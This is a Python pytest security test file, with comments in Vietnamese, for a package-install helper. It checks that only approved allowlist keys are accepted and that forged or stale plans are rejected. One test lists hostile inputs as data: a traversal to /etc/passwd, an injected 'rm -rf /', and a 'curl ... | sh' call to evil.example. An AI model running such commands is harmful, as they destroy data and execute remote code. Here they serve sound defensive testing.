"""CLI-004/SEC-01: ``allowlist_key`` ngoài danh sách đã duyệt → từ chối;
KHÔNG có đường nào nhận tên package/repo/key tùy ý; plan bị giả mạo/stale ở
``ApplyApprovedPackagePlan`` → ``E_PLAN_STALE``."""

from __future__ import annotations

import pytest
from tests.security.helper._fixtures import ADMIN_UID, make_helper

from namios_core.errors import ErrorCode, exit_code_for
from namios_core.helper_types import ApprovedPackagePlan, PackagePlanRequest
from namios_helper.allowlist import ApprovedPlanEntry, PackagePlanAllowlist
from namios_helper.caller import CallerIdentity
from namios_helper.errors import StalePlanError, UnknownAllowlistKeyError


def test_allowlist_key_ngoai_danh_sach_bi_tu_choi() -> None:
    allowlist = PackagePlanAllowlist()
    allowlist.register(
        ApprovedPlanEntry(
            allowlist_key="misa-sme-connector-v1",
            plan_id="plan-1",
            package_refs=("misa-sme-connector",),
        )
    )
    with pytest.raises(UnknownAllowlistKeyError) as exc_info:
        allowlist.plan_for("goi-tuy-y-do-caller-dat-ten")
    assert exc_info.value.code == ErrorCode.E_INPUT_SCHEMA
    assert exit_code_for(exc_info.value.code) == 2


def test_allowlist_key_khong_duoc_dien_giai_thanh_duong_dan_hay_url() -> None:
    allowlist = PackagePlanAllowlist()
    # Thử các chuỗi "độc" điển hình (traversal, URL, shell injection) — tất
    # cả PHẢI bị từ chối giống nhau (coi như unknown key), KHÔNG method nào
    # mở file/gọi mạng/exec dựa trên các chuỗi này.
    for malicious_key in (
        "../../etc/passwd",
        "http://evil.example/payload.deb",
        "misa-sme-connector-v1; rm -rf /",
        "$(curl http://evil.example | sh)",
    ):
        with pytest.raises(UnknownAllowlistKeyError):
            allowlist.plan_for(malicious_key)


def test_full_flow_qua_helper_voi_allowlist_key_hop_le() -> None:
    helper = make_helper()
    caller = CallerIdentity(uid=ADMIN_UID)
    plan = helper.PlanPackageInstall(
        caller, PackagePlanRequest(allowlist_key="misa-sme-connector-v1")
    )
    assert plan.plan_id
    assert plan.signed_digest

    status = helper.ApplyApprovedPackagePlan(caller, plan)
    assert status.reboot_required is False


def test_apply_voi_plan_gia_mao_digest_bi_tu_choi_plan_stale() -> None:
    helper = make_helper()
    caller = CallerIdentity(uid=ADMIN_UID)
    real_plan = helper.PlanPackageInstall(
        caller, PackagePlanRequest(allowlist_key="misa-sme-connector-v1")
    )

    forged_plan = ApprovedPackagePlan(plan_id=real_plan.plan_id, signed_digest="0" * 64)
    with pytest.raises(StalePlanError) as exc_info:
        helper.ApplyApprovedPackagePlan(caller, forged_plan)
    assert exc_info.value.code == ErrorCode.E_PLAN_STALE
    assert exit_code_for(exc_info.value.code) == 6


def test_apply_voi_plan_id_khong_ton_tai_bi_tu_choi() -> None:
    helper = make_helper()
    caller = CallerIdentity(uid=ADMIN_UID)
    fake_plan = ApprovedPackagePlan(plan_id="plan-khong-ton-tai", signed_digest="a" * 64)
    with pytest.raises(StalePlanError):
        helper.ApplyApprovedPackagePlan(caller, fake_plan)


def test_package_plan_request_chi_mang_allowlist_key_khong_mang_ten_goi_tu_do() -> None:
    # Chứng minh kiểu dữ liệu: PackagePlanRequest CHỈ có field allowlist_key
    # — không có repository_url/package_name/gpg_key nào để caller nhồi vào.
    fields = {f for f in PackagePlanRequest.__dataclass_fields__}
    assert fields == {"allowlist_key"}
